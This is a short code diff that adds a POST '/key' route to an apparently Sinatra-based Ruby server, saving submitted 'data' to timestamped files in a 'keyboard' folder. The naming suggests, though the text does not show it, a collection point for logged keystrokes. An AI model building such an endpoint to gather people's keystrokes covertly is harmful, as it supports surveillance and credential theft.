@@ -26,3 +26,11 @@ post '/upload' do
 	puts out_file
     end
 end
+
+post '/key' do
+    File.open("keyboard/#{Time.now.to_i}.txt", 'w') do | f_name |
+        f_name.write(params["data"])
+        f_name.close
+    end
+    "Done"
+end
